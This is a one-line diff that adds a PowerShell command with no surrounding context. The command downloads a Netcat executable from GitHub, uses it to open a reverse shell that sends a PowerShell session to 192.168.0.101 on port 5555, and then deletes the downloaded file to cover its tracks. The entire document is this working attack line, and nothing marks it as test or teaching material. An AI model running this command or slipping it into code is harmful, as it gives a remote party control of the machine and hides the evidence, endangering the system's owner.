@@ -1,0 +1,1 @@
+$url = 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe'; $output = 'nc64.exe'; Invoke-WebRequest -Uri $url -OutFile $output; & .\$output '192.168.0.101' '5555' '-e' 'powershell'; Remove-Item -Path $output
